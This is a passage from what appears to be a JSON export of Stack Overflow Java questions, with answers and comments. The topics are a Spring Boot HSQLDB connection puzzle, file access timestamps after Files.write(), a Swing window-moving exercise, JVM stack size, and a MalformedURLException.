&quot;credit_percent&quot;)\r\n        private BigDecimal creditPercent;\r\n    \r\n        @ManyToOne(targetEntity = Bank.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\r\n        @JoinColumn(name = &quot;bank_id&quot;)\r\n        private Bank bank;\r\n    \r\n        @OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH},\r\n                mappedBy = &quot;credit&quot;)\r\n        List&lt;CreditOffer&gt; creditOffers;\r\n    }\r\n\r\n\r\n    @Entity\r\n    @Table(name = &quot;credit_offer&quot;)\r\n    @Getter\r\n    @Setter\r\n    @NoArgsConstructor\r\n    public class CreditOffer {\r\n    \r\n        @Id\r\n        @Column(name = &quot;credit_offer_id&quot;)\r\n        @GeneratedValue(strategy = GenerationType.AUTO)\r\n        private UUID id;\r\n    \r\n        @ManyToOne(targetEntity = Client.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\r\n        @JoinColumn(name = &quot;client_id&quot;)\r\n        private Client client;\r\n    \r\n        @ManyToOne(targetEntity = Credit.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\r\n        @JoinColumn(name = &quot;credit_id&quot;)\r\n        private Credit credit;\r\n    \r\n        @Column(name = &quot;sum_of_credit&quot;)\r\n        private BigDecimal sumOfCredit;\r\n    \r\n        @OneToOne(targetEntity = PaymentSchedule.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\r\n        @JoinColumn(name = &quot;payment_schedule_id&quot;)\r\n        private PaymentSchedule paymentSchedule;\r\n    \r\n    }\r\n\r\n    @Entity\r\n    @Table(name = &quot;payment_schedule&quot;)\r\n    @Getter\r\n    @Setter\r\n    @NoArgsConstructor\r\n    public class PaymentSchedule {\r\n    \r\n        @Id\r\n        @Column(name = &quot;payment_schedule_id&quot;)\r\n        @GeneratedValue(strategy = GenerationType.AUTO)\r\n        private UUID id;\r\n    \r\n        @Column(name = &quot;date_of_payment&quot;)\r\n        private Date dateOfPayment;\r\n    \r\n        @Column(name = &quot;sum_of_payment&quot;)\r\n        private BigDecimal sumOfPayment;\r\n    \r\n        @Column(name = &quot;sum_of_principal&quot;)\r\n        private BigDecimal sumOfPrincipal;\r\n    \r\n        @Column(name = &quot;sum_of_percent&quot;)\r\n        private BigDecimal sumOfPercent;\r\n    \r\n    \r\n    }\r\n\r\nI output i get:\r\n\r\n    2022-01-18 03:02:59.911  INFO 10856 --- [           main] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Driver does not support get/set network timeout for connections. (feature not supported)\r\n    2022-01-18 03:02:59.913  INFO 10856 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.\r\n    2022-01-18 03:02:59.931  INFO 10856 --- [           main] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.HSQLDialect\r\n    Hibernate: drop table if exists banks CASCADE \r\n    Hibernate: drop table if exists clients CASCADE \r\n    Hibernate: drop table if exists credit_offer CASCADE \r\n    Hibernate: drop table if exists credits CASCADE \r\n    Hibernate: drop table if exists payment_schedule CASCADE \r\n    Hibernate: create table banks (bank_id binary(255) not null, primary key (bank_id))\r\n    Hibernate: create table clients (credit_id binary(255) not null, email varchar(255), passport_number bigint, telephone_number bigint, bank_id binary(255), primary key (credit_id))\r\n    Hibernate: create table credit_offer (credit_offer_id binary(255) not null, sum_of_credit numeric(19,2), client_id binary(255), credit_id binary(255), payment_schedule_id binary(255), primary key (credit_offer_id))\r\n    Hibernate: create table credits (credit_id binary(255) not null, credit_limit bigint, credit_percent numeric(19,2), bank_id binary(255), primary key (credit_id))\r\n    Hibernate: create table payment_schedule (payment_schedule_id binary(255) not null, date_of_payment timestamp, sum_of_payment numeric(19,2), sum_of_percent numeric(19,2), sum_of_principal numeric(19,2), primary key (payment_schedule_id))\r\n    Hibernate: alter table clients add constraint FKj0ik8mxsdhpqul7b0narc59og foreign key (bank_id) references banks\r\n    Hibernate: alter table credit_offer add constraint FKkarou343ffyichgtfy8yipelm foreign key (client_id) references clients\r\n    Hibernate: alter table credit_offer add constraint FK69n239vuy0ehdy1dq3bsd2ea9 foreign key (credit_id) references credits\r\n    Hibernate: alter table credit_offer add constraint FKdgpc16jjpyltxelv6qh90vo3l foreign key (payment_schedule_id) references payment_schedule\r\n    Hibernate: alter table credits add constraint FKt3c6cd1lq2lsiclu6bh2pux2y foreign key (bank_id) references banks\r\n\r\n\r\n\r\nThat is, tables are created, but it is not clear where and it is not clear why I do not see any changes in the database, not even connections to it\r\n\r\nDependencies in pom:\r\n\r\n    &lt;dependencies&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\r\n    \r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.hsqldb&lt;/groupId&gt;\r\n                &lt;artifactId&gt;hsqldb&lt;/artifactId&gt;\r\n                &lt;scope&gt;runtime&lt;/scope&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\r\n                &lt;artifactId&gt;lombok&lt;/artifactId&gt;\r\n                &lt;optional&gt;true&lt;/optional&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\r\n                &lt;scope&gt;test&lt;/scope&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n        &lt;/dependencies&gt;\r\n\r\n","title":"Driver does not support get/set network timeout for connections","body":"<p>I use Spring Boot and HSQLDB and I can't connect to the database.\nI always get an error &quot;Driver does not support get/set network timeout for connections&quot; despite the fact that I'm using the latest version of the driver.</p>\n<p>My application.properties :</p>\n<pre><code>spring.datasource.url=jdbc:hsqldb:mem:bank_db;DB_CLOSE_DELAY=-1\nspring.datasource.username=sa\nspring.datasource.password=\n        \nspring.jpa.hibernate.ddl-auto=create\nspring.jpa.show-sql=true\n</code></pre>\n<p>My entities:</p>\n<pre><code>@Entity\n@Table(name = &quot;banks&quot;)\n@Getter\n@Setter\n@NoArgsConstructor\npublic class Bank {\n\n    @Id\n    @Column(name = &quot;bank_id&quot;)\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    private UUID id;\n\n    @OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH},\n            mappedBy = &quot;bank&quot;)\n    private List&lt;Credit&gt; credits = new ArrayList&lt;&gt;();\n\n    @OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH},\n            mappedBy = &quot;bank&quot;)\n    private List&lt;Client&gt; clients = new ArrayList&lt;&gt;();\n}\n\n\n\n@Entity\n@Table(name = &quot;clients&quot;)\n@Getter\n@Setter\n@NoArgsConstructor\npublic class Client {\n\n\n   @Id\n   @Column(name = &quot;credit_id&quot;)\n   @GeneratedValue(strategy = GenerationType.AUTO)\n   private UUID id;\n\n   @Column(name = &quot;telephone_number&quot;)\n   private Long telephoneNumber;\n\n   @Column(name = &quot;email&quot;)\n   private String email;\n\n   @Column(name = &quot;passport_number&quot;)\n   private Long passportNumber;\n\n   @ManyToOne(targetEntity = Bank.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\n   @JoinColumn(name = &quot;bank_id&quot;)\n   private Bank bank;\n\n   @OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH},\n           mappedBy = &quot;client&quot;)\n   private List&lt;CreditOffer&gt; creditOffers;\n\n\n}\n\n\n@Entity\n@Table(name = &quot;credits&quot;)\n@Getter\n@Setter\n@NoArgsConstructor\npublic class Credit {\n\n    @Id\n    @Column(name = &quot;credit_id&quot;)\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    private UUID id;\n\n    @Column(name = &quot;credit_limit&quot;)\n    private Long creditLimit;\n\n    @Column(name = &quot;credit_percent&quot;)\n    private BigDecimal creditPercent;\n\n    @ManyToOne(targetEntity = Bank.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\n    @JoinColumn(name = &quot;bank_id&quot;)\n    private Bank bank;\n\n    @OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH},\n            mappedBy = &quot;credit&quot;)\n    List&lt;CreditOffer&gt; creditOffers;\n}\n\n\n@Entity\n@Table(name = &quot;credit_offer&quot;)\n@Getter\n@Setter\n@NoArgsConstructor\npublic class CreditOffer {\n\n    @Id\n    @Column(name = &quot;credit_offer_id&quot;)\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    private UUID id;\n\n    @ManyToOne(targetEntity = Client.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\n    @JoinColumn(name = &quot;client_id&quot;)\n    private Client client;\n\n    @ManyToOne(targetEntity = Credit.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\n    @JoinColumn(name = &quot;credit_id&quot;)\n    private Credit credit;\n\n    @Column(name = &quot;sum_of_credit&quot;)\n    private BigDecimal sumOfCredit;\n\n    @OneToOne(targetEntity = PaymentSchedule.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\n    @JoinColumn(name = &quot;payment_schedule_id&quot;)\n    private PaymentSchedule paymentSchedule;\n\n}\n\n@Entity\n@Table(name = &quot;payment_schedule&quot;)\n@Getter\n@Setter\n@NoArgsConstructor\npublic class PaymentSchedule {\n\n    @Id\n    @Column(name = &quot;payment_schedule_id&quot;)\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    private UUID id;\n\n    @Column(name = &quot;date_of_payment&quot;)\n    private Date dateOfPayment;\n\n    @Column(name = &quot;sum_of_payment&quot;)\n    private BigDecimal sumOfPayment;\n\n    @Column(name = &quot;sum_of_principal&quot;)\n    private BigDecimal sumOfPrincipal;\n\n    @Column(name = &quot;sum_of_percent&quot;)\n    private BigDecimal sumOfPercent;\n\n\n}\n</code></pre>\n<p>I output i get:</p>\n<pre><code>2022-01-18 03:02:59.911  INFO 10856 --- [           main] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Driver does not support get/set network timeout for connections. (feature not supported)\n2022-01-18 03:02:59.913  INFO 10856 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.\n2022-01-18 03:02:59.931  INFO 10856 --- [           main] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.HSQLDialect\nHibernate: drop table if exists banks CASCADE \nHibernate: drop table if exists clients CASCADE \nHibernate: drop table if exists credit_offer CASCADE \nHibernate: drop table if exists credits CASCADE \nHibernate: drop table if exists payment_schedule CASCADE \nHibernate: create table banks (bank_id binary(255) not null, primary key (bank_id))\nHibernate: create table clients (credit_id binary(255) not null, email varchar(255), passport_number bigint, telephone_number bigint, bank_id binary(255), primary key (credit_id))\nHibernate: create table credit_offer (credit_offer_id binary(255) not null, sum_of_credit numeric(19,2), client_id binary(255), credit_id binary(255), payment_schedule_id binary(255), primary key (credit_offer_id))\nHibernate: create table credits (credit_id binary(255) not null, credit_limit bigint, credit_percent numeric(19,2), bank_id binary(255), primary key (credit_id))\nHibernate: create table payment_schedule (payment_schedule_id binary(255) not null, date_of_payment timestamp, sum_of_payment numeric(19,2), sum_of_percent numeric(19,2), sum_of_principal numeric(19,2), primary key (payment_schedule_id))\nHibernate: alter table clients add constraint FKj0ik8mxsdhpqul7b0narc59og foreign key (bank_id) references banks\nHibernate: alter table credit_offer add constraint FKkarou343ffyichgtfy8yipelm foreign key (client_id) references clients\nHibernate: alter table credit_offer add constraint FK69n239vuy0ehdy1dq3bsd2ea9 foreign key (credit_id) references credits\nHibernate: alter table credit_offer add constraint FKdgpc16jjpyltxelv6qh90vo3l foreign key (payment_schedule_id) references payment_schedule\nHibernate: alter table credits add constraint FKt3c6cd1lq2lsiclu6bh2pux2y foreign key (bank_id) references banks\n</code></pre>\n<p>That is, tables are created, but it is not clear where and it is not clear why I do not see any changes in the database, not even connections to it</p>\n<p>Dependencies in pom:</p>\n<pre><code>&lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.hsqldb&lt;/groupId&gt;\n            &lt;artifactId&gt;hsqldb&lt;/artifactId&gt;\n            &lt;scope&gt;runtime&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n            &lt;optional&gt;true&lt;/optional&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n</code></pre>\n"},{"tags":["java","windows","filesystems","nio"],"answers":[{"tags":[],"owner":{"account_id":23963429,"reputation":11,"user_id":17953226,"display_name":"helltab"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642410079,"creation_date":1642410079,"answer_id":70738775,"question_id":70738194,"body_markdown":"If other threads read it in same time, you will get a new accessTime","title":"After Java Files.write(), the last access time is modified to a few milliseconds later?","body":"<p>If other threads read it in same time, you will get a new accessTime</p>\n"}],"owner":{"account_id":2769612,"reputation":117,"user_id":2384469,"display_name":"Axiaz"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":70,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1642462516,"creation_date":1642406763,"question_id":70738194,"body_markdown":"Here&#39;s the basic setup, writing to a text file.\r\n\r\nJava 11.0.13 Corretto, Windows 10.\r\n\r\n    Files.write(path, stuff);\r\n\r\n    System.out.println(((FileTime) Files.getAttribute(p, &quot;lastAccessTime&quot;)).toMillis());\r\n    System.out.println(((FileTime) Files.getAttribute(p, &quot;lastModifiedTime&quot;)).toMillis());\r\n    \r\n    Thread.sleep(100);\r\n\r\n    System.out.println(((FileTime) Files.getAttribute(p, &quot;lastAccessTime&quot;)).toMillis());\r\n    System.out.println(((FileTime) Files.getAttribute(p, &quot;lastModifiedTime&quot;)).toMillis());\r\n\r\n\r\nI&#39;d expect all 4 times to be the same. But what actually happens is something like this:\r\n\r\n```\r\n1642405963200\r\n1642405963200\r\n\r\n1642405963207\r\n1642405963200\r\n```\r\n\r\nFor some reason, the last access time is updated to a few milliseconds later (7 in this particular run).\r\n\r\nWhat&#39;s the reason for this behavior?\r\n\r\nEDIT: Further testing shows this only occurred to to the usage of the iterable parameter of the `write` method.\r\n\r\nThe following results in the strange behavior shown above.\r\n```\r\nFiles.write(path, Arrays.asList(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;));\r\n```\r\n\r\n\r\nEither of the following does not, and last access time is consistent as expected.\r\n```\r\nFiles.write(p, &quot;1\\n2\\n3\\n&quot;.getBytes());\r\nFiles.writeString(p, &quot;1\\n2\\n3\\n&quot;);\r\n```\r\n\r\n`","title":"After Java Files.write(), the last access time is modified to a few milliseconds later?","body":"<p>Here's the basic setup, writing to a text file.</p>\n<p>Java 11.0.13 Corretto, Windows 10.</p>\n<pre><code>Files.write(path, stuff);\n\nSystem.out.println(((FileTime) Files.getAttribute(p, &quot;lastAccessTime&quot;)).toMillis());\nSystem.out.println(((FileTime) Files.getAttribute(p, &quot;lastModifiedTime&quot;)).toMillis());\n\nThread.sleep(100);\n\nSystem.out.println(((FileTime) Files.getAttribute(p, &quot;lastAccessTime&quot;)).toMillis());\nSystem.out.println(((FileTime) Files.getAttribute(p, &quot;lastModifiedTime&quot;)).toMillis());\n</code></pre>\n<p>I'd expect all 4 times to be the same. But what actually happens is something like this:</p>\n<pre><code>1642405963200\n1642405963200\n\n1642405963207\n1642405963200\n</code></pre>\n<p>For some reason, the last access time is updated to a few milliseconds later (7 in this particular run).</p>\n<p>What's the reason for this behavior?</p>\n<p>EDIT: Further testing shows this only occurred to to the usage of the iterable parameter of the <code>write</code> method.</p>\n<p>The following results in the strange behavior shown above.</p>\n<pre><code>Files.write(path, Arrays.asList(&quot;1&quot;, &quot;2&quot;, &quot;3&quot;));\n</code></pre>\n<p>Either of the following does not, and last access time is consistent as expected.</p>\n<pre><code>Files.write(p, &quot;1\\n2\\n3\\n&quot;.getBytes());\nFiles.writeString(p, &quot;1\\n2\\n3\\n&quot;);\n</code></pre>\n<p>`</p>\n"},{"tags":["java","window"],"comments":[{"owner":{"account_id":3729650,"reputation":1020,"user_id":3102471,"accept_rate":71,"display_name":"mbmast"},"score":0,"creation_date":1643231995,"post_id":70745721,"comment_id":125288235,"body_markdown":"When posting any question on this site, please state what efforts you have taken to answer your own question.  For example, you never mentioned if you tried to execute your code and if so, what the result was.","body":"When posting any question on this site, please state what efforts you have taken to answer your own question.  For example, you never mentioned if you tried to execute your code and if so, what the result was."}],"answers":[{"tags":[],"owner":{"account_id":23714070,"reputation":143,"user_id":17743819,"display_name":"GodJihyo"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642443749,"creation_date":1642443749,"answer_id":70745883,"question_id":70745721,"body_markdown":"You are using the buttons to either add or subtract 10 from the X and Y coordinates, and checking to see if the values are within the range of the screen size, but not taking into account that you are changing them 10 units at a time.&lt;br&gt;\r\nThink about what happens when getX() returns a number from 1 to 9 and you click the &quot;left&quot; button, where will your new X coordinate be?\r\n","title":"Window moving by clicking on Button","body":"<p>You are using the buttons to either add or subtract 10 from the X and Y coordinates, and checking to see if the values are within the range of the screen size, but not taking into account that you are changing them 10 units at a time.<br>\nThink about what happens when getX() returns a number from 1 to 9 and you click the &quot;left&quot; button, where will your new X coordinate be?</p>\n"}],"owner":{"account_id":23219441,"reputation":1,"user_id":17311921,"display_name":"Jens Schramowski"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":38,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1642462315,"creation_date":1642442846,"question_id":70745721,"body_markdown":"I am learning Java development and my teacher gave me an exercise to create a window with four Buttons for moving the window up, down, right, or left in 10px steps. I wrote this source:\r\n```\r\nif (e.getActionCommand().equals(&quot;right&quot;)){\r\nif(getX() &lt; Toolkit.getDefaultToolkit().getScreenSize().getWidth()-getSize().getWidth())\r\nsetLocation(getX() + 10, getY());\r\n}\r\n\r\nif (e.getActionCommand().equals(&quot;left&quot;)){\r\nif(getX() &gt; 0)\r\nsetLocation(getX() - 10, getY());\r\n}\r\n\r\nif (e.getActionCommand().equals(&quot;up&quot;)){\r\nif(getY() &gt; 0)\r\nsetLocation(getX(), getY() - 10);\r\n}\r\n\r\nif (e.getActionCommand().equals(&quot;down&quot;)){\r\nif(getY() &lt; Toolkit.getDefaultToolkit().getScreenSize().getHeight()-getSize().getHeight())\r\nsetLocation(getX(), getY() + 10);\r\n}\r\nif(e.getActionCommand().equals(&quot;ende&quot;))\r\nSystem.exit(0);\r\n```\r\nMy teacher told me this source has three problems, but I have no idea what they are. Do you have some hints on how to improve it? ","title":"Window moving by clicking on Button","body":"<p>I am learning Java development and my teacher gave me an exercise to create a window with four Buttons for moving the window up, down, right, or left in 10px steps. I wrote this source:</p>\n<pre><code>if (e.getActionCommand().equals(&quot;right&quot;)){\nif(getX() &lt; Toolkit.getDefaultToolkit().getScreenSize().getWidth()-getSize().getWidth())\nsetLocation(getX() + 10, getY());\n}\n\nif (e.getActionCommand().equals(&quot;left&quot;)){\nif(getX() &gt; 0)\nsetLocation(getX() - 10, getY());\n}\n\nif (e.getActionCommand().equals(&quot;up&quot;)){\nif(getY() &gt; 0)\nsetLocation(getX(), getY() - 10);\n}\n\nif (e.getActionCommand().equals(&quot;down&quot;)){\nif(getY() &lt; Toolkit.getDefaultToolkit().getScreenSize().getHeight()-getSize().getHeight())\nsetLocation(getX(), getY() + 10);\n}\nif(e.getActionCommand().equals(&quot;ende&quot;))\nSystem.exit(0);\n</code></pre>\n<p>My teacher told me this source has three problems, but I have no idea what they are. Do you have some hints on how to improve it?</p>\n"},{"tags":["java","jvm","java-17"],"comments":[{"owner":{"account_id":9760,"reputation":85859,"user_id":18157,"accept_rate":100,"display_name":"Jim Garrison"},"score":1,"creation_date":1642460605,"post_id":70748500,"comment_id":125072016,"body_markdown":"_&quot;In particular, with many threads, is this going to give troubles?&quot;_  It&#39;s not clear what you&#39;re asking.  There will be trouble if you exceed the physical available memory on your machine.","body":"<i>&quot;In particular, with many threads, is this going to give troubles?&quot;</i>  It&#39;s not clear what you&#39;re asking.  There will be trouble if you exceed the physical available memory on your machine."},{"owner":{"account_id":3283799,"reputation":684,"user_id":2809272,"accept_rate":50,"display_name":"Marco Servetto"},"score":1,"creation_date":1642460721,"post_id":70748500,"comment_id":125072043,"body_markdown":"I wrote &quot;if the stack space is not actually used,&quot; that is what I mean, I will edit to add an example.","body":"I wrote &quot;if the stack space is not actually used,&quot; that is what I mean, I will edit to add an example."},{"owner":{"account_id":322981,"reputation":310745,"user_id":642706,"accept_rate":58,"display_name":"Basil Bourque"},"score":0,"creation_date":1642482164,"post_id":70748500,"comment_id":125075490,"body_markdown":"Perhaps you should give an example of how you would set a large stack size.","body":"Perhaps you should give an example of how you would set a large stack size."},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":3,"creation_date":1642520773,"post_id":70748500,"comment_id":125089638,"body_markdown":"Interesting question. I did a quick test with a real application (two or three dozen threads) and `-Xss1G` on Windows and it does indeed not seem to matter at all. But if you really use deep recursion a lot, it might become a problem if the stack memory is never given back (as long as the thread is alive).","body":"Interesting question. I did a quick test with a real application (two or three dozen threads) and <code>-Xss1G</code> on Windows and it does indeed not seem to matter at all. But if you really use deep recursion a lot, it might become a problem if the stack memory is never given back (as long as the thread is alive)."},{"owner":{"account_id":3283799,"reputation":684,"user_id":2809272,"accept_rate":50,"display_name":"Marco Servetto"},"score":0,"creation_date":1642562465,"post_id":70748500,"comment_id":125101608,"body_markdown":"did you mean that you fear that onece a stack acquires memory it never gives it back to the OS even if the stack has rolled back, or did you mean that my application may do a ton of recursion and then, deep deep in the recursion, a long lived loop? for the second one I think it would be ok (I&#39;m actually using that memory), I&#39;m worried about the first one.","body":"did you mean that you fear that onece a stack acquires memory it never gives it back to the OS even if the stack has rolled back, or did you mean that my application may do a ton of recursion and then, deep deep in the recursion, a long lived loop? for the second one I think it would be ok (I&#39;m actually using that memory), I&#39;m worried about the first one."},{"owner":{"account_id":50585,"reputation":39940,"user_id":150978,"accept_rate":78,"display_name":"Robert"},"score":0,"creation_date":1642581697,"post_id":70748500,"comment_id":125105764,"body_markdown":"If you ever encounter an endless recursion (which ends up in a StackOverflow) then you will face the downside, because it will take ages for the StackOverflow to reach it&#39;s limit. In general if you never encounter a StackOverflow in operation there is no need to increase the stack size.","body":"If you ever encounter an endless recursion (which ends up in a StackOverflow) then you will face the downside, because it will take ages for the StackOverflow to reach it&#39;s limit. In general if you never encounter a StackOverflow in operation there is no need to increase the stack size."},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":1,"creation_date":1642686590,"post_id":70748500,"comment_id":125140861,"body_markdown":"@MarcoServetto the former: a thread may execute a method with deep recursion, followed by other actions not using the now-committed stack at all. Or even lots of threads running into this scenario.","body":"@MarcoServetto the former: a thread may execute a method with deep recursion, followed by other actions not using the now-committed stack at all. Or even lots of threads running into this scenario."}],"owner":{"account_id":3283799,"reputation":684,"user_id":2809272,"accept_rate":50,"display_name":"Marco Servetto"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":555,"favorite_count":0,"down_vote_count":1,"up_vote_count":4,"answer_count":0,"score":3,"last_activity_date":1642460817,"creation_date":1642460469,"question_id":70748500,"body_markdown":"Is there any real downside to allow for a VERY large stack on the JVM, like gigabytes?\r\n\r\nIn particular, with many threads, is this going to give troubles? if the stack space is not actually used, is there going to be more wasted memory in practice on the most used JVMs running on win/linux/mac? \r\n\r\nFor example, if I allocate 1GB for the stack, and I run 100 threads, but they do not actually fill up the stack space with actual data,\r\nwould running the program require 100GB of actual physical memory?\r\n\r\nThis question is strongly connected with this old one (https://stackoverflow.com/questions/10456720/dynamically-expandable-jvm-stack) that was asked 10 years ago when the Java environment was quite different.\r\n\r\nNow near every Java program runs over a 64 bits architecture, and so much in JVM has overall improved.\r\n\r\nExpansion:\r\nI&#39;m often running very complex recursive programs on large/deep data structures, and having to use free monads or other program transformations to use the heap instead of the stack is complex, slow and possibly pointless.\r\nAn alternative would be using Java looms fibers, but.. again, may be just allocating a duper stack is easier and faster.\r\nI see why this is not done in C/C++, but under a VM this should be reasonable. Is it?","title":"Java 17 stack size and actual memory consumption","body":"<p>Is there any real downside to allow for a VERY large stack on the JVM, like gigabytes?</p>\n<p>In particular, with many threads, is this going to give troubles? if the stack space is not actually used, is there going to be more wasted memory in practice on the most used JVMs running on win/linux/mac?</p>\n<p>For example, if I allocate 1GB for the stack, and I run 100 threads, but they do not actually fill up the stack space with actual data,\nwould running the program require 100GB of actual physical memory?</p>\n<p>This question is strongly connected with this old one (<a href=\"https://stackoverflow.com/questions/10456720/dynamically-expandable-jvm-stack\">Dynamically expandable JVM stack</a>) that was asked 10 years ago when the Java environment was quite different.</p>\n<p>Now near every Java program runs over a 64 bits architecture, and so much in JVM has overall improved.</p>\n<p>Expansion:\nI'm often running very complex recursive programs on large/deep data structures, and having to use free monads or other program transformations to use the heap instead of the stack is complex, slow and possibly pointless.\nAn alternative would be using Java looms fibers, but.. again, may be just allocating a duper stack is easier and faster.\nI see why this is not done in C/C++, but under a VM this should be reasonable. Is it?</p>\n"},{"tags":["java"],"answers":[{"tags":[],"owner":{"account_id":1275953,"reputation":26182,"user_id":1231230,"accept_rate":76,"display_name":"Ankur Singhal"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642398323,"creation_date":1409918649,"answer_id":25685492,"question_id":25685347,"body_markdown":"You need to `encode` your URL.\r\nSpecial character which have to be escaped.\r\n\r\nEscaping example:\r\n\r\n    String url = &quot;http://e2e-soaservices:44000/3.1/StandardDocumentService?wsdl&quot;;\r\n    String yourURLStr = java.net.URLEncoder.encode(url, &quot;UTF-8&quot;);\r\n    java.net.URL url = new java.net.URL(yourURLStr);","title":"java.net.MalformedURLException:no protocol","body":"<p>You need to <code>encode</code> your URL.\nSpecial character which have to be escaped.</p>\n<p>Escaping example:</p>\n<pre><code>String url = &quot;http://e2e-soaservices:44000/3.1/StandardDocumentService?wsdl&quot;;\nString yourURLStr = java.net.URLEncoder.encode(url, &quot;UTF-8&quot;);\njava.net.URL url = new java.net.URL(yourURLStr);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":47283,"reputation":703817,"user_id":139985,"accept_rate":69,"display_name":"Stephen C"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642460342,"creation_date":1642398438,"answer_id":70737005,"question_id":25685347,"body_markdown":"So, according to the stacktrace that you posted, the actual problem is that you are trying to use a URL where various characters have been %-escaped when they shouldn&#39;t be.\r\n\r\n      http%3A%2F%2Fe2e-soaservices%3A44000%2F3.1%2FStandardDocumentService%3Fwsdl\r\n\r\nIn particular, the initial `http%3A%2F%2F` should actually be `http://`.  The URL parser looks for initial `:` ... and when it can&#39;t find it, it complains (correctly!) that there is no protocol component to the URL.\r\n\r\nI note that the error message does not match the URL in your code.  I don&#39;t know what is going on there .... but if the URL in the error message is what is actually being used, then it needs to be **decoded** (not encoded).\r\n\r\n\r\n----------------\r\n\r\nIf this is not making sense, please provide a proper complete [minimal reproducible example](https://stackoverflow.com/help/minimal-reproducible-example), AND the stack trace that you get from executing that example.\r\n\r\n\r\n","title":"java.net.MalformedURLException:no protocol","body":"<p>So, according to the stacktrace that you posted, the actual problem is that you are trying to use a URL where various characters have been %-escaped when they shouldn't be.</p>\n<pre><code>  http%3A%2F%2Fe2e-soaservices%3A44000%2F3.1%2FStandardDocumentService%3Fwsdl\n</code></pre>\n<p>In particular, the initial <code>http%3A%2F%2F</code> should actually be <code>http://</code>.  The URL parser looks for initial <code>:</code> ... and when it can't find it, it complains (correctly!) that there is no protocol component to the URL.</p>\n<p>I note that the error message does not match the URL in your code.  I don't know what is going on there .... but if the URL in the error message is what is actually being used, then it needs to be <strong>decoded</strong> (not encoded).</p>\n<hr 